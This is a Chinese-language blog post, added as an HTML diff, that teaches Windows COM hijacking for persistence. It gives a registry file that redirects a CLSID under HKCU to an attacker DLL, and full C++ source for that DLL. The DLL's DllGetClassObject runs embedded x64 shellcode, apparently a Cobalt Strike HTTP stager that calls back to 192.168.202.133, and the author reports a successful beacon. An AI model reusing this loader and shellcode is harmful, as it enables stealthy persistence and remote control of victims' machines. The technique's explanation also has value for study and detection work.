@@ -1,0 +1,154 @@
+<!doctype html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <meta name="theme-color" content="#15171a">
+  <meta name="description" content="COM劫持基础简介">
+  <meta name="author" content="YCr0w">
+  <title>COM Hijack | YCr0w&#39;blog</title>
+  <link rel="icon" type="image/x-icon" href="/assets/site/favicon.ico">
+  <link rel="stylesheet" href="/assets/css/site.css">
+  <script src="/assets/vendor/lucide.js" defer></script>
+  <script src="/assets/js/site.js" defer></script>
+</head>
+<body class="article-page">
+  <header class="site-header">
+    <div class="header-profile">
+      <a class="header-identity" href="/" aria-label="返回首页"><img class="header-avatar" src="/assets/site/avatar.jpg" alt="YCr0w"><span class="header-name">YCr0w</span></a>
+      <div class="header-links"><a href="https://github.com/YCr0w" target="_blank" rel="noopener" aria-label="GitHub"><i data-lucide="github" aria-hidden="true"></i></a><a href="mailto:3083981460@qq.com" aria-label="Email"><i data-lucide="mail" aria-hidden="true"></i></a></div>
+    </div>
+    <button class="nav-toggle icon-button" type="button" aria-label="打开导航"><i data-lucide="menu" aria-hidden="true"></i></button>
+    <nav class="main-nav" aria-label="主导航">
+      <a href="/"><i data-lucide="house" aria-hidden="true"></i><span>首页</span></a><a href="/categories/"><i data-lucide="folder-tree" aria-hidden="true"></i><span>分类</span></a><a href="/archives/"><i data-lucide="archive" aria-hidden="true"></i><span>归档</span></a><a href="/about/"><i data-lucide="user-round" aria-hidden="true"></i><span>关于</span></a>
+    </nav>
+    <div class="header-actions">
+      <div class="search-inline" id="search-inline">
+        <button class="icon-button" id="search-button" type="button" aria-label="搜索" aria-expanded="false"><i data-lucide="search" aria-hidden="true"></i></button>
+        <input id="search-input" type="search" placeholder="搜索文章、标签或分类" autocomplete="off">
+        <div class="search-results" id="search-results"></div>
+      </div>
+      <button class="icon-button" id="theme-button" type="button" aria-label="切换主题"><i data-lucide="sun-moon" aria-hidden="true"></i></button>
+    </div>
+  </header>
+  <main class="article-shell">
+    <article class="article"><header class="article-header"><a class="article-category" href="/categories/windows-security/" style="--category-color:#d59b28"><span class="category-dot"></span>Windows安全</a><h1>COM Hijack</h1><p>COM劫持基础简介</p><div class="article-meta"><span><i data-lucide="calendar-days" aria-hidden="true"></i>2026年8月13日</span><span><i data-lucide="clock-3" aria-hidden="true"></i>11 分钟阅读</span></div><div class="tag-list"><a href="/tags/com/">#COM</a></div></header><div class="article-body markdown-body"><p>COM 劫持是一种利用 Windows 注册表中 COM 接口搜索顺序的攻击手段。</p>
+<h5>CCOM 劫持的核心思想</h5>
+<p>注册表搜索顺序</p>
+<p>当系统尝试访问某个 COM 接口时，首先在 HKEY_CURRENT_USER (HKCU) 注册表配置单元中查找其定义。</p>
+<p>如果在 HKCU 中未找到，则继续在 HKEY_LOCAL_MACHINE (HKLM) 中查找。</p>
+<p>DLL 实现</p>
+<p>COM 接口通常使用 DLL 文件来实现其功能，注册表条目会包含实现该接口的 DLL 路径。</p>
+<p>攻击者可以在 HKCU 中插入伪造的 DLL 路径，从而劫持对该 COM 接口的访问。</p>
+<p>用户权限</p>
+<p>HKCU 配置单元属于当前用户，任何具有该用户权限的进程都可以修改它。</p>
+<p>这意味着运行在用户上下文中的进程会优先考虑 HKCU 中的定义。</p>
+<h5>劫持思路</h5>
+<p>寻找遗弃的 COM 键：</p>
+<p>使用注册表工具或编写脚本（如 PowerShell 或 Python）扫描注册表中的 COM 键，特别是在 HKCU\CLSID 和 HKLM\CLSID 下。</p>
+<p>检查每个键下的 InprocServer32 子项，确认其 Default 值是否指向一个不存在的 DLL 文件。</p>
+<p>修改 COM 键：</p>
+<p>一旦找到遗弃的键，可以通过修改 InprocServer32 下的 Default 值，将其指向您自己创建的恶意 DLL 文件。</p>
+<p>当其他应用程序尝试调用这个 COM 对象时，它们将加载您指定的 DLL，从而执行恶意代码。</p>
+<p>第二种思路涉及在 HKCU 注册表中添加相应的键值，以覆盖现有的 COM 对象。</p>
+<p>实现步骤</p>
+<p>创建新的 COM 注册项：</p>
+<p>在 HKCU\CLSID 下创建一个新键，使用您想要的 GUID。</p>
+<p>在此键下添加必要的子项和键值，例如 InprocServer32，并将其指向您自己的 DLL。</p>
+<p>覆盖现有 COM 对象：</p>
+<p>在 HKLM 下找到要覆盖的 COM 对象的注册项。</p>
+<p>添加或修改 InprocServer32 子项，使其指向您新的 DLL。</p>
+<p>在调用 COM 对象时，Windows 将首先检查 HKCU，如果找到匹配项，则使用该项。</p>
+<h2 id="com-hijack-implementation">COM hijack implementation</h2>
+<p>Process Monitor 来识别相关的 COM 接口，首先需要识别目标进程，然后使用过滤器只查看此进程触发的事件</p>
+<p>识别可用于执行 COM 劫持的 COM key非常简单，需要使用进程监视器来发现缺少 CLSID 且不需要提升权限 （HKCU） 的 COM 服务器。Process Monitor 可以配置以下过滤器：</p>
+<p><img src="/assets/posts/com-hijack/image/01-ProcMon%E8%BF%87%E6%BB%A4%E5%99%A8%E9%85%8D%E7%BD%AE.png" alt="COM Hijack" loading="lazy" decoding="async"></p>
+<p>通过筛选，发现这个COM key能够劫持</p>
+<p><code>\HKEY_LOCAL_MACHINE\SOFTWARE\Classes\CLSID\{9FC8E510-A27C-4B3B-B9A3-BF65F00256A8}\InProcServer32</code></p>
+<p><img src="/assets/posts/com-hijack/image/02-%E5%8F%AF%E5%8A%AB%E6%8C%81COM%E9%94%AE%E6%B3%A8%E5%86%8C%E8%A1%A8.png" alt="COM Hijack" loading="lazy" decoding="async"></p>
+<p>将这个注册表导出之后修改</p>
+<pre><code class="hljs language-c">Windows Registry Editor Version <span class="hljs-number">5.00</span>
+
+[HKEY_CURRENT_USER\SOFTWARE\Classes\CLSID\{<span class="hljs-number">9F</span>C8E510-A27C<span class="hljs-number">-4B</span>3B-B9A3-BF65F00256A8}]
+
+[HKEY_CURRENT_USER\SOFTWARE\Classes\CLSID\{<span class="hljs-number">9F</span>C8E510-A27C<span class="hljs-number">-4B</span>3B-B9A3-BF65F00256A8}\InProcServer32]
+@=<span class="hljs-string">"C:\\Users\\user\\Desktop\\COM hijack\\dataxchange.dll"</span>
+<span class="hljs-string">"ThreadingModel"</span>=<span class="hljs-string">"Both"</span>
+</code></pre><p>将注册表的值修改为替代dll的路径</p>
+<p>dll实现：</p>
+<pre><code class="hljs language-c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">"pch.h"</span> </span>
+<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;windows.h&gt;</span></span>
+<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;combaseapi.h&gt;</span></span>
+<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;cstring&gt;</span> </span>
+
+<span class="hljs-meta">#<span class="hljs-keyword">pragma</span> comment( linker, <span class="hljs-string">"/export:DllGetClassObject"</span> )</span>
+
+<span class="hljs-meta">#<span class="hljs-keyword">define</span> ORIGINAL_COM_DLL_PATH <span class="hljs-string">L"C:\\Windows\\System32\\dataxchange.dll"</span>  <span class="hljs-comment">//原先的dll路径</span></span>
+
+<span class="hljs-type">void</span> <span class="hljs-title function_">Go</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span> {
+    <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> buf[] = <span class="hljs-string">"\xfc\x48\x83\xe4\xf0\xe8\xc8\x00\x00\x00\x41\x51\x41\x50\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52\x18\x48\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52\x20\x8b\x42\x3c\x48\x01\xd0\x66\x81\x78\x18\x0b\x02\x75\x72\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x67\x48\x01\xd0\x50\x8b\x48\x18\x44\x8b\x40\x20\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41\x8b\x34\x88\x48\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b\x12\xe9\x4f\xff\xff\xff\x5d\x6a\x00\x49\xbe\x77\x69\x6e\x69\x6e\x65\x74\x00\x41\x56\x49\x89\xe6\x4c\x89\xf1\x41\xba\x4c\x77\x26\x07\xff\xd5\x48\x31\xc9\x48\x31\xd2\x4d\x31\xc0\x4d\x31\xc9\x41\x50\x41\x50\x41\xba\x3a\x56\x79\xa7\xff\xd5\xeb\x73\x5a\x48\x89\xc1\x41\xb8\x50\x00\x00\x00\x4d\x31\xc9\x41\x51\x41\x51\x6a\x03\x41\x51\x41\xba\x57\x89\x9f\xc6\xff\xd5\xeb\x59\x5b\x48\x89\xc1\x48\x31\xd2\x49\x89\xd8\x4d\x31\xc9\x52\x68\x00\x02\x40\x84\x52\x52\x41\xba\xeb\x55\x2e\x3b\xff\xd5\x48\x89\xc6\x48\x83\xc3\x50\x6a\x0a\x5f\x48\x89\xf1\x48\x89\xda\x49\xc7\xc0\xff\xff\xff\xff\x4d\x31\xc9\x52\x52\x41\xba\x2d\x06\x18\x7b\xff\xd5\x85\xc0\x0f\x85\x9d\x01\x00\x00\x48\xff\xcf\x0f\x84\x8c\x01\x00\x00\xeb\xd3\xe9\xe4\x01\x00\x00\xe8\xa2\xff\xff\xff\x2f\x72\x36\x6d\x48\x00\xdc\xa6\x9e\x83\xbd\x4d\xd9\x26\xdb\x60\xa5\x51\x49\xca\x10\xce\x54\x00\xeb\x9d\x5c\x1b\x3f\xb1\xf1\xb0\xbc\xa1\x32\x5d\x6d\xc6\x83\x9a\x10\xae\xa4\x0f\xed\xbf\x24\xe0\x13\x3c\x41\xdb\x5d\x53\xc2\x72\xe4\x02\x75\x6b\x21\xb2\x59\x82\xc9\xa8\x02\x43\x64\xe3\x49\x73\xf7\x9e\x3a\x9e\x8a\x83\xd2\x00\x55\x73\x65\x72\x2d\x41\x67\x65\x6e\x74\x3a\x20\x4d\x6f\x7a\x69\x6c\x6c\x61\x2f\x35\x2e\x30\x20\x28\x63\x6f\x6d\x70\x61\x74\x69\x62\x6c\x65\x3b\x20\x4d\x53\x49\x45\x20\x39\x2e\x30\x3b\x20\x57\x69\x6e\x64\x6f\x77\x73\x20\x4e\x54\x20\x36\x2e\x30\x3b\x20\x54\x72\x69\x64\x65\x6e\x74\x2f\x35\x2e\x30\x29\x0d\x0a\x00\x0d\x8a\x27\x2f\xce\x1c\x36\x11\x57\xf6\x19\xb1\x42\x9a\x5d\x97\xc4\xe7\xfb\x83\xfe\xb8\x7c\x47\x1e\x35\x3c\x75\x4d\x32\x19\x9c\x6d\xf5\xec\xce\x38\xcb\x17\x1c\x1a\xe4\x2b\x67\x4f\x43\x34\x1b\xf3\xe7\x64\x1f\xef\xd4\x8a\x56\xaf\x84\x5b\x4b\x99\x78\x4c\x28\x3b\x51\xf0\x34\xd7\x87\xb7\x5b\xd7\xe2\x3c\x58\x02\xce\x51\xde\x47\x8b\xb2\x99\x60\x2b\xcd\x34\x48\x71\xc4\x65\xc2\x79\x24\x17\x60\x60\xe6\xcd\x36\x44\x9a\x55\x59\xa7\xcc\xef\x57\x5d\x49\x6e\x45\x65\xb9\x2c\xef\x15\xe5\xe8\x46\x90\x6e\x9b\x67\xec\x5f\xb7\x11\xee\xaa\x37\xfb\x78\x26\x09\x8a\xbc\x36\x7d\x1f\xdb\xc7\xee\x1d\xa6\x4e\xbe\x5d\x67\x6b\xce\xb2\x98\x1e\x90\xac\xa5\x61\x15\x5d\x85\x7d\x22\xdc\x70\x9c\x6e\x9c\xfd\x5a\xdc\xa8\x9a\x02\x5a\x34\x02\x8e\x04\x93\xab\x17\x8d\x44\xc9\x2d\xf3\xbd\xbe\xd7\x97\xe7\x53\x53\xe8\x43\xbc\x88\xbb\x61\xa6\x90\x92\xab\x5c\x9a\xe2\x16\x77\xd0\xcf\x7b\x1d\x71\x02\x26\x72\xa2\x46\x30\x5e\xf3\xec\x82\x00\x41\xbe\xf0\xb5\xa2\x56\xff\xd5\x48\x31\xc9\xba\x00\x00\x40\x00\x41\xb8\x00\x10\x00\x00\x41\xb9\x40\x00\x00\x00\x41\xba\x58\xa4\x53\xe5\xff\xd5\x48\x93\x53\x53\x48\x89\xe7\x48\x89\xf1\x48\x89\xda\x41\xb8\x00\x20\x00\x00\x49\x89\xf9\x41\xba\x12\x96\x89\xe2\xff\xd5\x48\x83\xc4\x20\x85\xc0\x74\xb6\x66\x8b\x07\x48\x01\xc3\x85\xc0\x75\xd7\x58\x58\x58\x48\x05\x00\x00\x00\x00\x50\xc3\xe8\x9f\xfd\xff\xff\x31\x39\x32\x2e\x31\x36\x38\x2e\x32\x30\x32\x2e\x31\x33\x33\x00\x5e\x2e\x78\x90"</span>;
+
+    HANDLE myHeap = HeapCreate(HEAP_CREATE_ENABLE_EXECUTE, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>);
+    <span class="hljs-keyword">if</span> (!myHeap) {
+        <span class="hljs-keyword">return</span>;
+    }
+
+    <span class="hljs-comment">// 在创建的可执行堆上分配内存,大小为 buf 数组的大小</span>
+    <span class="hljs-type">void</span>* exec = HeapAlloc(myHeap, HEAP_ZERO_MEMORY, <span class="hljs-keyword">sizeof</span>(buf));
+    <span class="hljs-keyword">if</span> (!exec) {
+        HeapDestroy(myHeap);
+        <span class="hljs-keyword">return</span>;
+    }
+    <span class="hljs-built_in">memcpy</span>(exec, buf, <span class="hljs-keyword">sizeof</span>(buf));
+    ((<span class="hljs-type">void</span> (*)())exec)();
+
+    HeapFree(myHeap, <span class="hljs-number">0</span>, exec);
+    HeapDestroy(myHeap);
+}
+
+BOOL APIENTRY <span class="hljs-title function_">DllMain</span><span class="hljs-params">(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved)</span> {
+    <span class="hljs-keyword">switch</span> (ul_reason_for_call) {
+    <span class="hljs-keyword">case</span> DLL_PROCESS_ATTACH:
+
+        <span class="hljs-keyword">break</span>;
+    <span class="hljs-keyword">case</span> DLL_THREAD_ATTACH:
+
+        <span class="hljs-keyword">break</span>;
+    <span class="hljs-keyword">case</span> DLL_THREAD_DETACH:
+
+        <span class="hljs-keyword">break</span>;
+    <span class="hljs-keyword">case</span> DLL_PROCESS_DETACH:
+
+        <span class="hljs-keyword">break</span>;
+    }
+    <span class="hljs-keyword">return</span> TRUE; 
+}
+
+<span class="hljs-keyword">typedef</span> <span class="hljs-title function_">HRESULT</span><span class="hljs-params">(WINAPI* tDllGetClassObject)</span><span class="hljs-params">(REFCLSID rclsid, REFIID riid, LPVOID* ppv)</span>;
+
+STDAPI <span class="hljs-title function_">DllGetClassObject</span><span class="hljs-params">(REFCLSID rclsid, REFIID riid, LPVOID FAR* ppv)</span> {
+
+    Go();
+
+    tDllGetClassObject pDllGetClassObject; 
+    HMODULE hOrigDLL = LoadLibraryW(ORIGINAL_COM_DLL_PATH); 
+    pDllGetClassObject = (tDllGetClassObject)GetProcAddress(hOrigDLL, <span class="hljs-string">"DllGetClassObject"</span>); 
+
+    <span class="hljs-keyword">if</span> (!pDllGetClassObject)
+        <span class="hljs-keyword">return</span> S_FALSE; 
+
+    HRESULT hRes = pDllGetClassObject(rclsid, riid, ppv);
+    <span class="hljs-keyword">return</span> hRes; 
+}
+</code></pre><p>查看cs发现成功上线</p>
+<p><img src="/assets/posts/com-hijack/image/03-CS%E4%B8%8A%E7%BA%BF%E6%88%90%E5%8A%9F.png" alt="COM Hijack" loading="lazy" decoding="async"></p>
+<p>快速扫描工具：</p>
+<p><a href="https://github.dev/nccgroup/acCOMplice">https://github.dev/nccgroup/acCOMplice</a></p>
+<p><a href="https://github.com/Accenture/Spartacus?tab=readme-ov-file#installation">https://github.com/Accenture/Spartacus?tab=readme-ov-file#installation</a></p>
+</div><footer class="article-footer"><div><span>本文链接</span><a href="https://ycr0w.github.io/2026/08/13/com-hijack/">https://ycr0w.github.io/2026/08/13/com-hijack/</a></div></footer></article>
+    <aside class="article-aside"><div class="toc"><span>目录</span><a class="toc-level-2" href="#com-hijack-implementation">COM hijack implementation</a></div></aside>
+    <nav class="post-navigation"><a href="/2026/08/13/apt-c-48/"><i data-lucide="arrow-left" aria-hidden="true"></i><span><small>上一篇</small>APT-C-48（CNC）组织钓鱼攻击</span></a><a href="/2026/08/13/koi/"><span><small>下一篇</small>Koi Loader</span><i data-lucide="arrow-right" aria-hidden="true"></i></a></nav>
+  </main>
+  <footer class="site-footer"><span>© 2026 YCr0w</span></footer>
+</body>
+</html>
